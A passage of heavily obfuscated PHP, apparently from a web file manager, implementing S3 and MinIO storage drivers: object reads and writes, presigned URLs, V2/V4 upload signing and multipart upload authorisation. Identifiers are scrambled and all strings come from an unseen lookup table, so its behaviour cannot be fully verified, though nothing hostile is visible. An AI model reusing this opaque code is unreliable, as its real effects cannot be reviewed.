$³”éŒ‚Œ = array_merge($³”éŒ‚Œ, $ÒØŸ²¼); } if ($ùä®·¦ === null) { break; } continue; } if ($Èß) { if (!empty($¼õÙºåü)) { if (count($¼õÙºåü) > 1 || isset($¼õÙºåü[0][$†ËˆÂ‰ï[32]]) && $¼õÙºåü[0][$†ËˆÂ‰ï[32]] != $ä”ĞÚª¦) { return !0; } } } else { if (!empty($ÒØŸ²¼)) { return !0; } } if ($ùä®·¦ === null) { break; } } if ($ÖÛÑ×Ğ¸) { $úùİ³ÌŞ = array_diff($úùİ³ÌŞ, array($ä”ĞÚª¦)); $úùİ³ÌŞ = count(array_unique($úùİ³ÌŞ)); $³”éŒ‚Œ = count(array_unique($³”éŒ‚Œ)); return array($†ËˆÂ‰ï[242] => $úùİ³ÌŞ, $†ËˆÂ‰ï[243] => $³”éŒ‚Œ); } return !1; } public function listAll($‹ì ¼ù¯) { $èŠõÏÉ =& $_SERVER[ıÚ˜š²İ]; $èò¯îşä = $this->fileList($‹ì ¼ù¯, $èŠõÏÉ[12], !0); $´¥ä»ğ¬ = array_to_keyvalue($èò¯îşä[$èŠõÏÉ[86]], $èŠõÏÉ[32]); foreach ($èò¯îşä[$èŠõÏÉ[85]] as $Ÿè©îˆ™) { if (is_string($Ÿè©îˆ™)) { $´¥ä»ğ¬[$Ÿè©îˆ™] = array($èŠõÏÉ[79] => 0); } } return $this->listAllFiles($‹ì ¼ù¯, $´¥ä»ğ¬); } public function canRead($†ŠÖ§Õ¹) { $¦ñŠŒÌ =& $_SERVER[ıÚ˜š²İ]; $ñå€°»œ = $this->client->getAccessControlPolicy($this->bucket, $†ŠÖ§Õ¹); if (!$ñå€°»œ) { return !1; } return in_array($ñå€°»œ, array($¦ñŠŒÌ[244], $¦ñŠŒÌ[245], $¦ñŠŒÌ[246])) ? !0 : !1; } public function canWrite($‚İÄÁïÁ) { $ôÑğâåÇ =& $_SERVER[ıÚ˜š²İ]; $Í÷¤«ª = $this->client->getAccessControlPolicy($this->bucket, $‚İÄÁïÁ); if (!$Í÷¤«ª) { return !1; } return in_array($Í÷¤«ª, array($ôÑğâåÇ[244], $ôÑğâåÇ[245])) ? !0 : !1; } public function getContent($ûı§­¯Ö) { return $this->client->getObject($this->bucket, $ûı§­¯Ö); } public function setContent($ãÄŠıÔš, $”¡ííÅ = '', $÷ª¹ú‡ô = false) { $ñ‘·İÇ´ =& $_SERVER[ıÚ˜š²İ]; $ãÄŠıÔš = $÷ª¹ú‡ô ? trim($ãÄŠıÔš, $ñ‘·İÇ´[8]) . $ñ‘·İÇ´[8] : $ãÄŠıÔš; $¤Ü¼ı¢ = get_file_mime(get_path_ext($ãÄŠıÔš)); $Ò·õ£ï· = $this->client->putObject($”¡ííÅ, $this->bucket, $ãÄŠıÔš, $ñ‘·İÇ´[232], array(), $¤Ü¼ı¢); if (!$Ò·õ£ï·) { return !1; } if ($÷ª¹ú‡ô) { return !0; } return $Ò·õ£ï· ? !0 : !1; } public function fileSubstr($ÍöÑì¸Ï, $Ï€ØÁã, $¢’Ãµ) { $Á´ÛŠºû = $Ï€ØÁã + $¢’Ãµ - 1; return $this->client->getObject($this->bucket, $ÍöÑì¸Ï, array($_SERVER[ıÚ˜š²İ][247] => "\142\x79\164\x65\163\75{$Ï€ØÁã}\55{$Á´ÛŠºû}")); } public function upload($Û¶£‚‚ø, $ãÁøù˜, $Õáœş = false, $Ğ‰¬Ÿƒæ = REPEAT_REPLACE) { $–á‹ë¤ =& $_SERVER[ıÚ˜š²İ]; $ö¯À··è = array($–á‹ë¤[248] => @md5_file($ãÁøù˜)); $Ã¬â¸ = array($–á‹ë¤[249] => get_file_mime(get_path_ext($Û¶£‚‚ø))); if (IO::size($ãÁøù˜) <= 1024 * 1024 * 200) { $ˆ£ÚË–° = $this->client->putObjectFile($ãÁøù˜, $this->bucket, $Û¶£‚‚ø, $–á‹ë¤[232], $ö¯À··è, $Ã¬â¸); return !empty($ˆ£ÚË–°) ? $this->getPathOuter($Û¶£‚‚ø) : !1; } $ì•û£Ä‹ = $this->client->multiUploadObject($ãÁøù˜, $this->bucket, trim($Û¶£‚‚ø, $–á‹ë¤[8]), $ö¯À··è, $Ã¬â¸); return $ì•û£Ä‹ ? $this->getPathOuter($Û¶£‚‚ø) : !1; } public function download($â½µ—Î¡, $„Öà·ü) { if (!@is_dir($this->pathFather($„Öà·ü)) && !IO::mkdir($this->pathFather($„Öà·ü))) { return !1; } $½æòç = $this->client->getObject($this->bucket, $â½µ—Î¡, array(), $„Öà·ü); return $½æòç !== !1 ? $„Öà·ü : !1; } public function link($Ÿ­¹ƒŠŸ, $ëñâÈ§ß = array()) { return $this->getPreSignedURL($Ÿ­¹ƒŠŸ, 3600 * 12, $ëñâÈ§ß); } private function getPreSignedURL($ì—ó†–ò, $êÛå¶òÈ, $ï­¤§È¡ = array(), $Õæò±ò = "\107\105\x54") { $¿¸‰Œ¸ =& $_SERVER[ıÚ˜š²İ]; $ì—ó†–ò = trim($ì—ó†–ò, $¿¸‰Œ¸[8]); if ($this->signVer == $¿¸‰Œ¸[250]) { return $this->client->getPreSignedV2URL($this->bucket, $ì—ó†–ò, $êÛå¶òÈ, $Õæò±ò, $ï­¤§È¡); } return $this->client->getPreSignedV4URL($this->bucket, $ì—ó†–ò, $êÛå¶òÈ, array(), $Õæò±ò, $ï­¤§È¡); } public function fileOut($÷°²ñÎş, $®‚ñà¿” = false, $‚ÏÑÛ˜ó = false, $ƒ©Ô¼ü¤ = '') { $‘’‚ö‰ü =& $_SERVER[ıÚ˜š²İ]; if ($this->isFileOutServer()) { return $this->fileOutServer($÷°²ñÎş, $®‚ñà¿”, $‚ÏÑÛ˜ó, $ƒ©Ô¼ü¤); } if (!$‚ÏÑÛ˜ó) { $‚ÏÑÛ˜ó = $this->pathThis($÷°²ñÎş); } $ÊŞñşÈ = get_file_mime(get_path_ext($‚ÏÑÛ˜ó)); if ($ÊŞñşÈ == $‘’‚ö‰ü[251]) { return parent::fileOut($÷°²ñÎş, $®‚ñà¿”, $‚ÏÑÛ˜ó, $ƒ©Ô¼ü¤); } $«Ê÷˜ñ† = array($‘’‚ö‰ü[252] => $ÊŞñşÈ); if ($®‚ñà¿”) { $«Ê÷˜ñ†[$‘’‚ö‰ü[253]] = $‘’‚ö‰ü[254] . rawurlencode($‚ÏÑÛ˜ó); } else { } $‰éµé‰µ = $this->link($÷°²ñÎş, $«Ê÷˜ñ†); $this->fileOutLink($‰éµé‰µ); } public function fileOutServer($Ì¹è­ù¿, $çÚÑµœ¡ = false, $àÚ¦¦ = false, $­¼Õø¤ó = '') { parent::fileOut($Ì¹è­ù¿, $çÚÑµœ¡, $àÚ¦¦, $­¼Õø¤ó); } public function fileOutImageServer($¸çØø…°, $Àˆ‚õ•Ü = 250) { parent::fileOutImage($¸çØø…°, $Àˆ‚õ•Ü); } public function fileOutLink($½¸ ñ¿) { $ŠüÁ¡÷  =& $_SERVER[ıÚ˜š²İ]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ŠüÁ¡÷ [67], $ŠüÁ¡÷ [66], $ŠüÁ¡÷ [68])) && !get_url_scheme($this->endpoint) && substr($½¸ ñ¿, 0, 7) == $ŠüÁ¡÷ [219]) { $½¸ ñ¿ = $ŠüÁ¡÷ [220] . substr($½¸ ñ¿, 7); } header($ŠüÁ¡÷ [175] . $½¸ ñ¿); die; } public function hashMd5($øá£€¸’, $¹™³óØÄ = '') { $÷®Ä–êñ = $this->objectMeta($øá£€¸’); if (!$÷®Ä–êñ) { return !1; } $¹™³óØÄ = $¹™³óØÄ ? $¹™³óØÄ : _get($÷®Ä–êñ, $_SERVER[ıÚ˜š²İ][255]); return $¹™³óØÄ; } public function uploadFormData($òŸÉüÍñ, $ù¬äÎã = 3600) { $ÌÛ‹ÉÌÂ =& $_SERVER[ıÚ˜š²İ]; if (!$this->_isClientAsync()) { $›ş¶‰Ó = $this->getPreSignedURL($òŸÉüÍñ, $ù¬äÎã, array(), $ÌÛ‹ÉÌÂ[256]); return array($ÌÛ‹ÉÌÂ[209] => str_replace($ÌÛ‹ÉÌÂ[219], $ÌÛ‹ÉÌÂ[257], $›ş¶‰Ó)); } if (isset($GLOBALS[$ÌÛ‹ÉÌÂ[6]][$ÌÛ‹ÉÌÂ[92]][$ÌÛ‹ÉÌÂ[258]]) && $GLOBALS[$ÌÛ‹ÉÌÂ[6]][$ÌÛ‹ÉÌÂ[92]][$ÌÛ‹ÉÌÂ[258]] == $ÌÛ‹ÉÌÂ[231]) { return $this->uploadMultiData($òŸÉüÍñ, $ù¬äÎã); } if ($this->signVer == $ÌÛ‹ÉÌÂ[250]) { return $this->uploadFormDataV2($òŸÉüÍñ, $ù¬äÎã); } return $this->uploadFormDataV4($òŸÉüÍñ, $ù¬äÎã); } public function uploadFormDataV2($±ï¿­èÈ, $å®îÁø = 3600) { $–“ü×Ù… =& $_SERVER[ıÚ˜š²İ]; $ì‹Íş‰Û = $this->pathFather($±ï¿­èÈ); $¯æÊÏàà = $this->client->getHttpUploadPostParams($this->bucket, $ì‹Íş‰Û, $–“ü×Ù…[232], $å®îÁø); $®ÍÃ€ä¢ = array_merge((array) $¯æÊÏàà, array($–“ü×Ù…[259] => $–“ü×Ù…[250], $–“ü×Ù…[209] => $this->getHost())); if ($this->_isClientAsync()) { unset($®ÍÃ€ä¢[$–“ü×Ù…[259]]); } return $®ÍÃ€ä¢; } public function uploadFormDataV4($å”´ò‰, $¬’ä“—¶ = 3600) { $Ëà™Ì†û =& $_SERVER[ıÚ˜š²İ]; $‚Ã³îö = $Ëà™Ì†û[232]; $Á¿Ÿ–½è = $Ëà™Ì†û[260]; $×Ÿğ—¶Ô = $Ëà™Ì†û[62]; $š¿©È€Ë = gmdate($Ëà™Ì†û[261]); $¨ıáûó = gmdate($Ëà™Ì†û[262]); $ŞØñ´ù = $Ëà™Ì†û[263]; $ë‰÷€ø¯ = $¬’ä“—¶ . $Ëà™Ì†û[12]; $·ÖºçÃÛ = $Ëà™Ì†û[264]; $æåšŠí˜ = array($this->accessKey, $¨ıáûó, $this->region, $×Ÿğ—¶Ô, $ŞØñ´ù); $„„ìŠô = implode($Ëà™Ì†û[8], $æåšŠí˜); $ĞÒÅ¸º© = array($Ëà™Ì†û[265] => gmdate($Ëà™Ì†û[266], strtotime($Ëà™Ì†û[267])), $Ëà™Ì†û[268] => array(array($Ëà™Ì†û[269] => $this->bucket), array($Ëà™Ì†û[270], $Ëà™Ì†û[271], $Ëà™Ì†û[12]), array($Ëà™Ì†û[270], $Ëà™Ì†û[272], $Ëà™Ì†û[12]), array($Ëà™Ì†û[273] => $·ÖºçÃÛ), array($Ëà™Ì†û[274] => $„„ìŠô), array($Ëà™Ì†û[275] => $Á¿Ÿ–½è), array($Ëà™Ì†û[276] => $š¿©È€Ë), array($Ëà™Ì†û[277] => $ë‰÷€ø¯))); $ÒÉĞ±‰› = base64_encode(json_encode($ĞÒÅ¸º©)); $–å…›Ä = hash_hmac($Ëà™Ì†û[278], $¨ıáûó, $Ëà™Ì†û[279] . $this->secret, !0); $•ó×Ğµê = hash_hmac($Ëà™Ì†û[278], $this->region, $–å…›Ä, !0); $Î±ÓàÀö = hash_hmac($Ëà™Ì†û[278], $×Ÿğ—¶Ô, $•ó×Ğµê, !0); $°ã®ô¶¢ = hash_hmac($Ëà™Ì†û[278], $ŞØñ´ù, $Î±ÓàÀö, !0); $­õÈ¹È‘ = hash_hmac($Ëà™Ì†û[278], $ÒÉĞ±‰›, $°ã®ô¶¢); $€é˜Ş¿— = array($Ëà™Ì†û[249] => $Ëà™Ì†û[12], $Ëà™Ì†û[273] => $·ÖºçÃÛ, $Ëà™Ì†û[280] => $ÒÉĞ±‰›, $Ëà™Ì†û[274] => $„„ìŠô, $Ëà™Ì†û[275] => $Á¿Ÿ–½è, $Ëà™Ì†û[276] => $š¿©È€Ë, $Ëà™Ì†û[277] => $ë‰÷€ø¯, $Ëà™Ì†û[281] => $­õÈ¹È‘, $Ëà™Ì†û[259] => $Ëà™Ì†û[250], $Ëà™Ì†û[209] => $this->getHost()); if ($this->_isClientAsync()) { unset($€é˜Ş¿—[$Ëà™Ì†û[259]]); } return $€é˜Ş¿—; } public function uploadMultiData($Ì¡ËÙ‘£, $Øµ€±†ø = 3600) { $”„šÍî› =& $_SERVER[ıÚ˜š²İ]; $İÔ¦Ì„ = $this->signVer == $”„šÍî›[250] ? gmdate($”„šÍî›[282]) : gmdate($”„šÍî›[283]); $•Ô½Á— = array(); $îıŠ×¹ù = $this->client->getUploadId($this->bucket, $Ì¡ËÙ‘£, $•Ô½Á—); if (!$îıŠ×¹ù) { return !1; } $Öõò†À™ = array($”„šÍî›[284] => $îıŠ×¹ù, $”„šÍî›[209] => $this->getHost() . $”„šÍî›[8] . $this->pathEncode($Ì¡ËÙ‘£), $”„šÍî›[285] => $İÔ¦Ì„, $”„šÍî›[97] => $Ì¡ËÙ‘£, $”„šÍî›[259] => $this->signVer); if ($this->_isClientAsync()) { unset($Öõò†À™[$”„šÍî›[259]]); } return $Öõò†À™; } public function uploadMultiAuth($²ëã, $¶ëùã°Ã = array()) { $ù›§»Îş =& $_SERVER[ıÚ˜š²İ]; if ($this->signVer == $ù›§»Îş[250]) { if (isset($¶ëùã°Ã[$ù›§»Îş[286]])) { return $this->uploadPartAuthV2($²ëã, $¶ëùã°Ã); } return $this->uploadListAuthV2($²ëã, $¶ëùã°Ã); } if (isset($¶ëùã°Ã[$ù›§»Îş[286]])) { return $this->uploadPartAuthV4($²ëã, $¶ëùã°Ã); } return $this->uploadListAuthV4($²ëã, $¶ëùã°Ã); } public function uploadPartAuthV2($›ÏŠÔ³ , $£ù˜Û = array()) { $ü‹µ ½« =& $_SERVER[ıÚ˜š²İ]; $ãõ’³ü¶ = $£ù˜Û[$ü‹µ ½«[97]]; $ŒÚ…ìòù = gmdate($ü‹µ ½«[282]); $×ó–•Š— = array_intersect_key($£ù˜Û, array_flip(array($ü‹µ ½«[286], $ü‹µ ½«[284]))); ksort($×ó–•Š—); $Ä˜µùŞº = $×ó–•Š— ? $ü‹µ ½«[76] . http_build_query($×ó–•Š—, null, $ü‹µ ½«[287], PHP_QUERY_RFC3986) : $ü‹µ ½«[12]; $œéÂÉÖ = array($ü‹µ ½«[256], $ü‹µ ½«[12], $ü‹µ ½«[123], $ü‹µ ½«[12], "\170\x2d\141\155\172\55\144\x61\164\x65\72{$ŒÚ…ìòù}", $ü‹µ ½«[8] . $this->bucket . $ü‹µ ½«[8] . $this->pathEncode($ãõ’³ü¶) . $Ä˜µùŞº); $šïÂñ´ = implode($ü‹µ ½«[288], $œéÂÉÖ); $Ìº¿éÕ‡ = $this->client->__getSignature($šïÂñ´); return array($ü‹µ ½«[289] => $Ìº¿éÕ‡, $ü‹µ ½«[285] => $ŒÚ…ìòù); } public function uploadListAuthV2($òª¦şó‘, $òÚ°Ï•– = array()) { $ÆÜñæ…ç =& $_SERVER[ıÚ˜š²İ]; $´™»µâ³ = $òÚ°Ï•–[$ÆÜñæ…ç[97]]; $·¾ÓÎû = $òÚ°Ï•–[$ÆÜñæ…ç[284]]; $Š¦”’Ç = $this->client->listParts($this->bucket, $´™»µâ³, $·¾ÓÎû); if (!$Š¦”’Ç) { return !1; } $ÏàÓ÷ = gmdate($ÆÜñæ…ç[282]); $ÚÉÍ®Ì = $ÆÜñæ…ç[290] . $·¾ÓÎû; $¶‰¬§Í¹ = array($ÆÜñæ…ç[291], $ÆÜñæ…ç[12], $ÆÜñæ…ç[123], $ÆÜñæ…ç[12], "\x78\x2d\x61\155\x7a\55\144\x61\x74\145\72{$ÏàÓ÷}", $ÆÜñæ…ç[8] . $this->bucket . $ÆÜñæ…ç[8] . $this->pathEncode($´™»µâ³) . $ÚÉÍ®Ì); $ÈÄ¹İÚ = implode($ÆÜñæ…ç[288], $¶‰¬§Í¹); $ÛŞÒ¹¯° = $this->client->__getSignature($ÈÄ¹İÚ); return array($ÆÜñæ…ç[289] => $ÛŞÒ¹¯°, $ÆÜñæ…ç[285] => $ÏàÓ÷, $ÆÜñæ…ç[292] => $Š¦”’Ç); } public function uploadPartAuthV4($¨ŞÔÂùÓ, $¯ÙÔªëÀ = array()) { $±øˆŠå =& $_SERVER[ıÚ˜š²İ]; $Í“ÇóÉÒ = $¯ÙÔªëÀ[$±øˆŠå[97]]; $Ë†–é‚Ş = array($±øˆŠå[276] => gmdate($±øˆŠå[283]), $±øˆŠå[293] => _get($¯ÙÔªëÀ, $±øˆŠå[294], hash($±øˆŠå[278], $±øˆŠå[12]))); $ÄŠÇÖ… = explode($±øˆŠå[211], $this->getHost()); $‘ÎıŸÅ‹ = array($±øˆŠå[295] => $ÄŠÇÖ…[1], $±øˆŠå[296] => $±øˆŠå[12], $±øˆŠå[249] => $±øˆŠå[123], $±øˆŠå[297] => $¯ÙÔªëÀ[$±øˆŠå[79]]); $á‡ØÆõŸ = $±øˆŠå[256]; $Ÿ”¼â = $±øˆŠå[8] . $this->pathEncode($Í“ÇóÉÒ); $óşæÖÃ± = array_intersect_key($¯ÙÔªëÀ, array_flip(array($±øˆŠå[286], $±øˆŠå[284]))); $ÅØ€±Œù = $this->client->__getSignatureV4($Ë†–é‚Ş, $‘ÎıŸÅ‹, $á‡ØÆõŸ, $Ÿ”¼â, $óşæÖÃ±); return array($±øˆŠå[289] => $ÅØ€±Œù, $±øˆŠå[293] => $Ë†–é‚Ş[$±øˆŠå[293]], $±øˆŠå[285] => $Ë†–é‚Ş[$±øˆŠå[276]]); } public function uploadListAuthV4($”ˆÏĞñ, $—‹Š«õµ = array()) { $ŞÕŠ«ä =& $_SERVER[ıÚ˜š²İ]; $ù¸ŞØÛ = $—‹Š«õµ[$ŞÕŠ«ä[97]]; $ã½ßËàÚ = $—‹Š«õµ[$ŞÕŠ«ä[284]]; $˜ø½’•ú = $this->client->listParts($this->bucket, $ù¸ŞØÛ, $ã½ßËàÚ); if (!$˜ø½’•ú) { return !1; } $ó€°úÅñ = $ŞÕŠ«ä[298]; foreach ($˜ø½’•ú as $†½©­¦§) { $ó€°úÅñ .= $ŞÕŠ«ä[299] . "\x3c\x50\141\x72\164\x4e\x75\x6d\x62\x65\162\x3e{$†½©­¦§[$ŞÕŠ«ä[300]]}\74\x2f\120\141\x72\164\116\165\155\142\x65\162\76\12" . "\74\x45\124\x61\x67\x3e{$†½©­¦§[$ŞÕŠ«ä[301]]}\74\57\105\124\x61\x67\76\12" . $ŞÕŠ«ä[302]; } $ó€°úÅñ .= $ŞÕŠ«ä[303]; $á³¹ÃÆü = array($ŞÕŠ«ä[276] => gmdate($ŞÕŠ«ä[283]), $ŞÕŠ«ä[293] => hash($ŞÕŠ«ä[278], $ó€°úÅñ)); $ôŠ†Ôã = explode($ŞÕŠ«ä[211], $this->getHost()); $“‰€§²¿ = array($ŞÕŠ«ä[295] => $ôŠ†Ôã[1], $ŞÕŠ«ä[249] => $ŞÕŠ«ä[123], $ŞÕŠ«ä[297] => strlen($ó€°úÅñ)); $úÎÙ«ÙÀ = $ŞÕŠ«ä[291]; $•”ÆÃ¡ä = $ŞÕŠ«ä[8] . $this->pathEncode($ù¸ŞØÛ); $ÉÑÎù€· = array($ŞÕŠ«ä[284] => $ã½ßËàÚ); $İ–²‹ÎÁ = $this->client->__getSignatureV4($á³¹ÃÆü, $“‰€§²¿, $úÎÙ«ÙÀ, $•”ÆÃ¡ä, $ÉÑÎù€·); return array($ŞÕŠ«ä[289] => $İ–²‹ÎÁ, $ŞÕŠ«ä[293] => $á³¹ÃÆü[$ŞÕŠ«ä[293]], $ŞÕŠ«ä[285] => $á³¹ÃÆü[$ŞÕŠ«ä[276]], $ŞÕŠ«ä[292] => $˜ø½’•ú); } private function _isClientAsync() { $…¼À·”Ê =& $_SERVER[ıÚ˜š²İ]; static $€û®Ã§ = null; if ($€û®Ã§ === null) { $ˆ©›†ø„ = isset($_REQUEST[$…¼À·”Ê[304]]) ? json_decode($_REQUEST[$…¼À·”Ê[304]], !0) : !1; $€û®Ã§ = $ˆ©›†ø„ && _get($ˆ©›†ø„, $…¼À·”Ê[305]) == $…¼À·”Ê[306]; } return $€û®Ã§; } public function getHost() { $¬ı•ÇÖÜ =& $_SERVER[ıÚ˜š²İ]; $¸æïóÂî = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($¬ı•ÇÖÜ[70], $¬ı•ÇÖÜ[64], $¬ı•ÇÖÜ[69], $¬ı•ÇÖÜ[62]))) { return $¸æïóÂî . $¬ı•ÇÖÜ[8] . $this->bucket; } if ($this->osType == $¬ı•ÇÖÜ[62] && !is_domain($¸æïóÂî)) { return $¸æïóÂî . $¬ı•ÇÖÜ[8] . $this->bucket; } $¸æïóÂî = explode($¬ı•ÇÖÜ[211], $¸æïóÂî); return $¸æïóÂî[0] . $¬ı•ÇÖÜ[211] . $this->bucket . $¬ı•ÇÖÜ[10] . $¸æïóÂî[1]; } public function size($¹·ÓœšÀ) { $çáŞÇµ¾ = $this->objectMeta($¹·ÓœšÀ); return $çáŞÇµ¾ ? $çáŞÇµ¾[$_SERVER[ıÚ˜š²İ][79]] : 0; } public function info($‹ëƒ‘”Æ) { if ($this->isFolder($‹ëƒ‘”Æ)) { return $this->folderInfo($‹ëƒ‘”Æ); } else { if ($this->isFile($‹ëƒ‘”Æ)) { return $this->fileInfo($‹ëƒ‘”Æ); } } return !1; } public function exist($çïı‡Ÿ¼) { return $this->isFile($çïı‡Ÿ¼) || $this->isFolder($çïı‡Ÿ¼); } public function isFile($¹Âë¯è) { return !$this->isFolder($¹Âë¯è) && $this->objectMeta($¹Âë¯è); } public function isFolder($óÁ¬‡³ƒ) { return $this->cacheMethod($_SERVER[ıÚ˜š²İ][180], $óÁ¬‡³ƒ); } protected function objectMeta($âÓù¥Ò¾) { return $this->cacheMethod($_SERVER[ıÚ˜š²İ][182], $âÓù¥Ò¾); } protected function _objectMeta($Ÿ²Ê) { $è¨µ¥üš =& $_SERVER[ıÚ˜š²İ]; $Ÿ²Ê = rtrim($Ÿ²Ê, $è¨µ¥üš[8]); try { $æ°‚¶‘ = $this->client->getObjectInfo($this->bucket, $Ÿ²Ê); if (!isset($æ°‚¶‘[$è¨µ¥üš[255]]) && isset($æ°‚¶‘[$è¨µ¥üš[307]])) { $æ°‚¶‘[$è¨µ¥üš[255]] = $æ°‚¶‘[$è¨µ¥üš[307]]; } } catch (Exception $Å®ñ¿ª¸) { $æ°‚¶‘ = !1; } if (!$æ°‚¶‘) { } return $æ°‚¶‘; } protected function _isFolder($åİç¤úÊ) { $’ß†á =& $_SERVER[ıÚ˜š²İ]; $åİç¤úÊ = rtrim($åİç¤úÊ, $’ß†á[8]) . $’ß†á[8]; if ($åİç¤úÊ == $’ß†á[12] || $åİç¤úÊ == $’ß†á[8]) { return !0; } $Ôª¯ñ²ñ = $this->client->getBucket($this->bucket, $åİç¤úÊ, null, 1); if (empty($Ôª¯ñ²ñ[$’ß†á[239]])) { return !1; } $•†°Ûã° = $Ôª¯ñ²ñ[$’ß†á[239]][0][$’ß†á[32]]; return stripos($•†°Ûã°, $åİç¤úÊ) === 0 ? !0 : !1; if (substr($•†°Ûã°, -1) == $’ß†á[8]) { return !0; } if (get_path_this($•†°Ûã°) == get_path_this($åİç¤úÊ)) { return !1; } return !0; } public function listObject($îÎ˜Ï±†) { return $this->fileList($îÎ˜Ï±†, $_SERVER[ıÚ˜š²İ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($—­à¬É©) { $ÀÇœîšô =& $_SERVER[ıÚ˜š²İ]; parent::__construct($—­à¬É©); $this->setSignVersion($ÀÇœîšô[250]); if (!$this->region) { $this->region = $ÀÇœîšô[308]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $çÚĞòç = $this->getBktRegion(); return $this->region == $çÚĞòç ? !0 : !1; } public function uploadFormData($öÎƒúÒï, $«‹ı•¢ = 3600) { $ ûİüçË =& $_SERVER[ıÚ˜š²İ]; $Íû“ƒòú = $ ûİüçË[232]; $Ïò’„­¨ = $ ûİüçË[260]; $î‹Åİ½Ï = $ ûİüçË[62]; $œúİâëÒ = gmdate($ ûİüçË[261]); $Ùİ³¢€” = gmdate($ ûİüçË[262]); $Ğ‚ˆÂŠ– = $ ûİüçË[263]; $Ì’É†İ = $«‹ı•¢ . $ ûİüçË[12]; $ş×²æ”ê = $ ûİüçË[264]; $Âø•·ƒú = array($this->accessKey, $Ùİ³¢€”, $this->region, $î‹Åİ½Ï, $Ğ‚ˆÂŠ–); $‘´ ßÅ† = implode($ ûİüçË[8], $Âø•·ƒú); $£¬öÖÎ  = array($ ûİüçË[265] => gmdate($ ûİüçË[266], strtotime($ ûİüçË[267])), $ ûİüçË[268] => array(array($ ûİüçË[269] => $this->bucket), array($ ûİüçË[309] => $Íû“ƒòú), array($ ûİüçË[270], $ ûİüçË[271], $ ûİüçË[12]), array($ ûİüçË[270], $ ûİüçË[272], $ ûİüçË[12]), array($ ûİüçË[270], $ ûİüçË[310], $ ûİüçË[12]), array($ ûİüçË[273] => $ş×²æ”ê), array($ ûİüçË[274] => $‘´ ßÅ†), array($ ûİüçË[275] => $Ïò’„­¨), array($ ûİüçË[276] => $œúİâëÒ), array($ ûİüçË[277] => $Ì’É†İ))); $ª”Ì†Õƒ = base64_encode(json_encode($£¬öÖÎ )); $Ãµ’ıöÈ = hash_hmac($ ûİüçË[278], $Ùİ³¢€”, $ ûİüçË[279] . $this->secret, !0); $“™Ì±ü­ = hash_hmac($ ûİüçË[278], $this->region, $Ãµ’ıöÈ, !0); $ÃÄÔ… = hash_hmac($ ûİüçË[278], $î‹Åİ½Ï, $“™Ì±ü­, !0); $ÆÏšó¦ø = hash_hmac($ ûİüçË[278], $Ğ‚ˆÂŠ–, $ÃÄÔ…, !0); $ñÈŒ³ó = hash_hmac($ ûİüçË[278], $ª”Ì†Õƒ, $ÆÏšó¦ø); $¨âÏ¢ = array($ ûİüçË[249] => $ ûİüçË[12], $ ûİüçË[297] => $ ûİüçË[12], $ ûİüçË[309] => $Íû“ƒòú, $ ûİüçË[273] => $ş×²æ”ê, $ ûİüçË[280] => $ª”Ì†Õƒ, $ ûİüçË[311] => $‘´ ßÅ†, $ ûİüçË[312] => $Ïò’„­¨, $ ûİüçË[313] => $œúİâëÒ, $ ûİüçË[314] => $Ì’É†İ, $ ûİüçË[315] => $ñÈŒ³ó, $ ûİüçË[209] => $this->getHost()); return $¨âÏ¢; } } goto B¯ÕÕùªé; bï•ƒ„Ç†Ü: class PathDriverDriverShareItem { public function __construct($ò§ƒÌì) { $this->pathParse = $ò§ƒÌì; } public function __call($¶õ ô‡ , $ıÌêéÅŠ) { $†ê€ôí =& $_SERVER[ıÚ˜š²İ]; if (method_exists($this, $¶õ ô‡ )) { return; } $˜‡ÈÔ½ä = call_user_func_array(array($†ê€ôí[1451], $¶õ ô‡ ), $ıÌêéÅŠ); $¶ıàá‰Â = array($†ê€ôí[1452], $†ê€ôí[1453], $†ê€ôí[1454], $†ê€ôí[1455], $†ê€ôí[625], $†ê€ôí[627], $†ê€ôí[1456], $†ê€ôí[110], $†ê€ôí[1457], $†ê€ôí[1458]); if (in_array($¶õ ô‡ , $¶ıàá‰Â)) { $˜‡ÈÔ½ä = $this->getPathOuter($˜‡ÈÔ½ä); } return $˜‡ÈÔ½ä; } public function copy($ê¨ºîÙ©, $­ÆğÀ£, $û÷×¿ = false, $Ô‰¶¹‰» = false) { return $this->copyMove($ê¨ºîÙ©, $­ÆğÀ£, $û÷×¿, $_SERVER[ıÚ˜š²İ][625], $Ô‰¶¹‰»); } public function move($¯ÓÑß²Ä, $ÔÛ¡™¬ì, $àÉÀ¡Ì¼ = false, $…ôÃçËì = false) { return $this->copyMove($¯ÓÑß²Ä, $ÔÛ¡™¬ì, $àÉÀ¡Ì¼, $_SERVER[ıÚ˜š²İ][627], $…ôÃçËì); } private function copyMove($ìêÒ¸¸×, $›çêÌ½, $´ØñĞ­Ó, $É¼†ÁÍ·, $ò™ãûæã = false) { $³í»ö“ª =& $_SERVER[ıÚ˜š²İ]; $ÔÔÒ“ä³ = $›çêÌ½; $ï­Òİİ = IO::driverMake($›çêÌ½); if ($ï­Òİİ->pathParse[$³í»ö“ª[1244]]) { $›çêÌ½ = $ï­Òİİ->pathParse[$³í»ö“ª[1244]]; } else { $›çêÌ½ = $ÔÔÒ“ä³; } $ëàÏŞœá = IO::copyMove($ìêÒ¸¸×, $›çêÌ½, $´ØñĞ­Ó, $É¼†ÁÍ·, $ò™ãûæã); $ëàÏŞœá = $this->getPathOuter($ëàÏŞœá); return $ëàÏŞœá; } public function pathThis($ÅÂ¨ÄÀ) { return get_path_this($this->pathParse[$_SERVER[ıÚ˜š²İ][87]]); } public function pathFather($Ñ™ã–Ë) { return get_path_father($this->pathParse[$_SERVER[ıÚ˜š²İ][87]]); } public function iconvSystem($úÇÅØ¤) { return $úÇÅØ¤; } protected function infoParse($ûÀÕÈ», $ĞàØçãİ = false) { $õÏçî´ö =& $_SERVER[ıÚ˜š²İ]; $Â©‡ü·ı = $this->pathParse[$õÏçî´ö[564]][$õÏçî´ö[1271]] . $this->pathParse[$õÏçî´ö[1263]]; if ($ĞàØçãİ) { $ó´Ÿ¯¡ = IO::infoWithChildren($Â©‡ü·ı); } else { $ó´Ÿ¯¡ = IO::info($Â©‡ü·ı); } $«ıäòÚ = $this->pathParse[$õÏçî´ö[564]]; return Action($õÏçî´ö[1449])->_shareItemeParse($ó´Ÿ¯¡, $«ıäòÚ); } public function 